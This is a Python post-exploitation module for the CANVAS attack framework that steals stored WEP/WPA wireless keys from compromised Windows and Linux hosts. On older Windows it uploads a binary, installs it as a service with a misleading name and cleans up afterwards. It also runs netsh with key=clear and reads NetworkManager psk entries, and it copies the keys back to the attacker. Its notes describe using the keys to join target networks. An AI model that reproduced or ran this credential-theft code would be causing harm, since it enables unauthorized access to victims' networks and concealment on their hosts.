#! /usr/bin/env python

# sys imports
import sys, re, os

# CANVAS imports
from exploitutils import *
from canvaserror import *
from time import sleep

from win32MosdefShellServer import SERVICE_WIN32_OWN_PROCESS
from ExploitTypes.localcommand import LocalCommand

# path appends
if '.' not in sys.path:
    sys.path.append('.')

NAME = "Dump WEP/WPA Encryption Keys"
DESCRIPTION = "Get WEP and WPA keys off the target system"
DOCUMENTATION = {}

VERSION = "1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Commands"
PROPERTY['ARCH'] = [ ["Unix", "All"], ["Windows", "All"] ]

DOCUMENTATION['NOTES'] = """
This will attempt to retrieve the SSID and any associated WEP or WPA PMK keys
that are stored on the target system.  This currently is for any key that is governed
by the Wireless Zero Configuration service which is the default for windows XP/2003.
In Windows Vista onwards, it works using the wireles AutoConfig service. In Linux, it
works using the Network Manager (root access may be needed).  A file called
wirelesskeys.txt will contain the keys and will be loaded into the current CANVAS
session downloaded_files directory.
"""

DEVNOTES = """
For now the service is used like this:
wirelesskeyservice.exe install   < -- this will install the service (you can check services.msc
                                      to verify that the Z35 service is there
net start 'WIRELESS Z36 UTILITY' < -- this will start the service and collect and decrypt key data
net stop 'WIRELESS Z36 UTILITY'  < -- this will stop the service and write anything found to
                                      %SystemRoot%\TEMP\wirelesskeys.txt and then the service will
                                      uninstall itself

MOSDEF will execute these commands romotely but eventually the service will take care of
installation, starting, and deleting itself.  In the future this will also pull the entire wlanprofile
for each SSID so we can easily and programatically import target profiles in our own system so we
can seemlessly connect to target networks.

"""

class theexploit(LocalCommand):
    def __init__(self):
        LocalCommand.__init__(self)
        self.name                       = NAME
        self.node                       = None
        self.filename                   = os.path.join("Resources","wirelesskeyservice.exe")
        self.wirelesskeyfile            = "wirelesskeys.txt"
        self.wirelesskeyservice         = "wirelesskeyservice.exe"
        self.servicename                = "Wireless Utility" #don't change this!

    def neededListenerTypes(self):
        return []

    def nodeUpload(self, src, dst):
        try:
            ret = self.node.upload(src, destfilename = dst)
            #ret = self.node.upload(src, dst)
        except NodeCommandError, i:
            self.log("[!] Failed to upload %s to %s: %s" % (src, dst, str(i)))
            return 0

        self.log("[!] upload succeeded !")
        return 1


    def WindowsUpExec(self, filename):
        "handle exec on a Win32 node"
        #self.tempdirectory = self.node.shell.GetEnvironmentVariable("temp")

        dst  = self.tempdirectory+"\\"+self.wirelesskeyservice

        # upload
        if not self.nodeUpload(filename, dst):
            self.log("[X] upload failed !")
            return 0
        else:
            self.log("[!] uploaded src: %s to dst: %s"% (filename, dst))

    def getArgs(self):

        systemroot = self.node.shell.GetEnvironmentVariable("windir")

        hKey    = self.node.shell.RegOpenKeyEx("HKEY_LOCAL_MACHINE",
                                      "SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment",
                                      "KEY_ALL_ACCESS")
        ##even though RegOpenKeyEx should return value 0 (ERROR_SUCCESS), we get back a 0 upon failure
        if hKey == 0:
            self.log("could not read registry key to detmerine temp file location.  Assuming %s\\TEMP"%systemroot)
            self.tempdirectory = systemroot + "\\TEMP"
        else:
            ret,datatype,data = self.node.shell.RegQueryValueEx(hKey,"TMP")
            self.log("data from registry %s"%data)
            #swap out the variable with the actual path and get rid of the null byte at the end
            value = data.replace("%SystemRoot%",systemroot).strip("\x00")
            self.tempdirectory = value

    def start_wireless_zero_configuration(self):
        """
        If Wireless Zero Configuration is not running on the target host then we wont
        get the stored credentials.  This attempts to start the service for us before
        starting our custom service to dump the keys.
        """
        self.log("Attempting to start Wireless Configuration service")
        start = self.engine.getModuleExploit("startservice")
        start.link(self)
        start.argsDict["serviceName"]="Wireless Zero Configuration"
        ret = start.run()
        if ret == 0:
            ##Before we give up let's try to start the older version of Wireless Zero Configuration
            ##that's in 2000 SP4, for example.
            start.argsDict["serviceName"]="Wireless Configuration"
            ret = start.run()
            if ret == 0:
                self.log("Couldn't start Wireless Configuration service")

    def createService(self):
        exploit=self.engine.getModuleExploit("createservice")
        exploit.link(self)
        exploit.argsDict["serviceName"]=self.servicename
        exploit.argsDict["binaryName"] =self.tempdirectory+"\\"+self.wirelesskeyservice
        exploit.argsDict["serviceType"]=SERVICE_WIN32_OWN_PROCESS
        exploit.argsDict["description"]="Wireless Profile Utility Z36"
        ret=exploit.run()
        if ret==0:
            return 0

    def startAndStopService(self):
        start=self.engine.getModuleExploit("startservice")
        start.link(self)
        start.argsDict["serviceName"]=self.servicename
        ret=start.run()
        if ret==0:
            return 0
        time.sleep(5)
        stop=self.engine.getModuleExploit("stopservice")
        stop.link(self)
        stop.argsDict["serviceName"]=self.servicename
        ret=stop.run()
        if ret==0:
            return 0
        self.log("Sleeping to let service fully stop")
        time.sleep(10)

    def downloadFile(self):
        exploit=self.engine.getModuleExploit("download")
        exploit.link(self)
        exploit.argsDict["source"]=self.tempdirectory+"\\"+self.wirelesskeyfile
        self.log("Downloading file")
        ret=exploit.run()
        if ret==0:
            return 0
        else:
            return

    def cleanup(self):
        ret=self.node.unlink(self.tempdirectory+"\\"+self.wirelesskeyfile)
        if ret==0:
            return 0
        ret=self.node.unlink(self.tempdirectory+"\\"+self.wirelesskeyservice)
        if ret==0:
            return 0


    def run(self):
        self.node = self.argsDict["passednodes"][0]
        if self.node.nodetype == "linuxNode":
            return self.runNetworkManager()
        if self.node.nodetype not in ["win32Node", "win64Node"]:
            self.log("%s node type not supported" % self.node.nodetype)
            return 0

        if "win32api" in self.node.capabilities:
            ret, val = self.node.shell.GetVersionEx()
            self.log("Windows Major Version: %d" % val["Major Version"])
            majorVersion = int(val["Major Version"])
        else:
            majorVersion = 6

        if majorVersion>=6:
            return self.runWlanAutoConfig()
        else:
            return self.runWirelessZeroConfig()

    def runWirelessZeroConfig(self):

        self.getArgs()

        ##attempt to start wireless zero configuration before we begin
        self.start_wireless_zero_configuration()

        ret=self.WindowsUpExec(self.filename)
        if ret==0:
            self.log("Error uploading file")
            return 0
        ret=self.createService()
        if ret==0:
            self.log("Error creating remote service")
            return 0
        ret=self.startAndStopService()
        if ret==0:
            self.log("Error starting and stopping service")
            return 0
        ret=self.downloadFile()
        if ret==0:
            self.log("Error downloading file")
            return 0
        ret=self.cleanup()
        if ret==0:
            self.log("Error deleting file - may still be on the target system")
        return 1

    def runNetworkManager(self):
        keys_found=[]
        node=self.node
        directory='/etc/NetworkManager/system-connections'
        result = node.shell.dodir(directory)
        import pipes
        for f in result:
            if f[0] not in ['.', '..']:
                lines= node.shell.runcommand('cat %s'%(pipes.quote(directory+'/'+f[0])))
                if lines:
                    psw=None
                    ssid=None
                    for l in lines.splitlines():
                        if l.startswith('ssid='):
                            ssid=l[5:]
                        if l.startswith('psk='):
                            psw=l[4:]
                    if ssid and psw:
                        keys_found.append((ssid, psw))
        return self.process_key_founds(keys_found)

    def runWlanAutoConfig(self):
        keys_found=[]
        profiles= self.node.runcommand('netsh wlan show profiles')
        search=re.compile(':\s+(.*)$').search
        for profile in [m.group(1) for l in profiles.splitlines() for m in [search(l)] if m]:
            profile_clear= self.node.runcommand('netsh wlan show profiles "'+profile+'" key=clear')
            search=re.compile('Key Content\s+:\s+(.*)$').search
            keys=[m.group(1) for l in profile_clear.splitlines() for m in [search(l)] if m]
            for k in keys: # I don't know if it's possible to be more than one key for profile
                keys_found.append((profile, k))
        return self.process_key_founds(keys_found)

    def process_key_founds(self, keys_found):
        if keys_found:
            outputdir = self.engine.create_new_session_output_dir(self.node.get_interesting_interface(), 'downloaded_files')
            output_filename=os.path.join(outputdir,self.wirelesskeyfile)
            self.log("Wireless keys found. Saving to file: %s" % output_filename)
            try:
                os.stat(outputdir)
            except OSError:
                self.log("Could not find %s so creating it" % outputdir)
                try:
                    os.mkdir(outputdir)
                except (OSError, IOError), i:
                    e = "Failed to create output directory %s: %s" % (outputdir, str(i))
                    self.log(e)
                    return 0
            f=file(output_filename, 'wb')
            for profile, key in keys_found:
                f.write('%s: %s\n'%(profile, key))
            return 1
        else:
            self.log("No WiFi keys were found.")
            return 0

